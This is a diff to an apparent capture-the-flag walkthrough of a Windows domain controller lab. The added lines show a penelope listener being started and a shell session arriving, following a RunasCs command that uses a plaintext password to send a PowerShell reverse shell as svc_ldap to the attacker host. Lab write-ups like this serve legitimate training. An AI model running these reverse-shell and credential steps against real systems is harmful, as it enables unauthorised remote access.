@@ -304,6 +304,12 @@ Evil-WinRM* PS C:\Users\svc_winrm\Documents> upload runascs/RunasCs.exe
 Now its on the system i can use this to execute powershell commands via evil-winrm as svc_ldap
 
 ```python
+penelope -p 1337                   
+[+] Listening for reverse shells on 0.0.0.0:1337 -> 127.0.0.1 • 192.168.1.157 • 10.10.14.90
+➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
+```
+
+```python
 *Evil-WinRM* PS C:\Users\svc_winrm\Documents> ./RunasCs.exe svc_ldap 'M1XyC9pW7qT5Vn' powershell -r 10.10.14.90:1337
 [*] Warning: The logon for user 'svc_ldap' is limited. Use the flag combination --bypass-uac and --logon-type '8' to obtain a more privileged token.
 
@@ -313,5 +319,19 @@ Now its on the system i can use this to execute powershell commands via evil-win
 ```
 Ill get a session as `svc_ldap`
 
-```p
+```python
+penelope -p 1337                   
+[+] Listening for reverse shells on 0.0.0.0:1337 -> 127.0.0.1 • 192.168.1.157 • 10.10.14.90
+➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
+[+] [New Reverse Shell] => DC 10.129.232.130 Microsoft_Windows_Server_2022_Standard-x64-based_PC 👤 voleur\svc_ldap 😍️ Session ID <1>
+[+] Added readline support...
+[+] Interacting with session [1] • Readline • Menu key Ctrl-D ⇐
+[+] Session log: /home/kali/.penelope/sessions/DC~10.129.232.130-Microsoft_Windows_Server_2022_Standard-x64-based_PC/2026_04_06-15_03_22-495.log
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+PS C:\Windows\system32> whoami
+whoami
+voleur\svc_ldap
+PS C:\Windows\system32> 
 ```
+I now have a session as `svc_ldap`
+
